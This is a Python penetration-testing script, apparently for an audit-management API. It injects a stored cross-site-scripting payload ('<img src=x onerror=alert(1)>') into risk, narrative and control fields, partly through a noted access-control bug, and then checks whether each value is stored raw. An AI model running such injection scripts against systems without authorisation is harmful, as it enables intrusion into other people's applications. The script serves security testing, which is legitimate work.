import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TT=open('/tmp/bac_TESTER').read().strip()
TO=open('/tmp/bac_OWNER').read().strip()
def req(m,p,body=None,tok=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+(tok or TT),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='zx'+uuid.uuid4().hex[:6]
PAY=f'<img src=x onerror=alert(1)>ZX{tag}'
print(f"payload: {PAY}\n")
print("=== Tester injects into risks/narratives (BUG-019 inversion lets them) ===")
for plural,rid,key,field in [('risks',1,'risk','name'),('risks',2,'risk','name'),
                             ('narratives',31,'narrative','name'),
                             ('narratives',38,'narrative','name')]:
    c,b=req('PUT',f'/api/v1/{plural}/{rid}',{key:{field:PAY}})
    c2,b2=req('GET',f'/api/v1/{plural}/{rid}')
    raw = PAY in b2
    print(f"  {plural}/{rid}.{field:8} PUT={c} raw={raw}")
    if raw:
        try:
            arr=json.loads(b2).get(plural) or []
            print(f"      STORED RAW: {arr[0].get(field)!r}")
        except: pass
print()
print("=== other writable fields on controls (Owner) ===")
for field in ['description','notes','custom_text1','custom_text2']:
    c,b=req('PUT','/api/v1/controls/1',{"control":{field:PAY}},tok=TO)
    c2,b2=req('GET','/api/v1/controls/1',tok=TO)
    print(f"  controls.1.{field:14} PUT={c} raw={PAY in b2}")
